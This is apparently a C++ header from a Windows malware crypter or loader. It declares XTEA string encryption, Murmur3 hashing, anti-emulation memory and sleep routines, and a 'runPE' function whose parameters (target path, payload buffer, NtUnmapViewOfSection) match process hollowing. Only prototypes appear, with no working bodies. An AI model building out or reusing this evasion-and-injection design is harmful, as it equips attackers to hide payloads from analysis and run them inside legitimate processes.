#pragma once
#include <stdint.h>
#include <windows.h>

static uint32_t MAGIC = 0xBABE2525;

extern "C" {
	void __stdcall XTEA_encrypt(void *lpData, uint32_t ddSize, void *lpKey, uint32_t dkSize);
}

extern "C" {
	void __stdcall XTEA_decrypt(void *lpData, uint32_t ddSize, void *lpKey, uint32_t dkSize);
}

extern "C" {
	uint32_t __stdcall Murmur3 (void *lpData, uint32_t dSize, uint32_t dSeed);
}

void str_to_decrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key);
void str_to_encrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key);

uint8_t *antiemul_mem(uint32_t size_memory, uint8_t *data_protect, uint32_t size_data_protect);
void anti_emul_sleep(uintptr_t base, char *crypt_str, uint32_t size_str, uint32_t sleep_wait);
bool runPE(uintptr_t base,LPSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG desiredBase, bool unmap_target, char* ntdll, char* NtUnmapViewOfSection);


void function1(void);
void function2(void);
void function3(void);
void function4(void);
void function5(void);
void function6(void);
void function7(void);
void function8(void);
void function9(void);
void function10(void);
void function11(void);
void function12(void);
void function13(void);
void function14(void);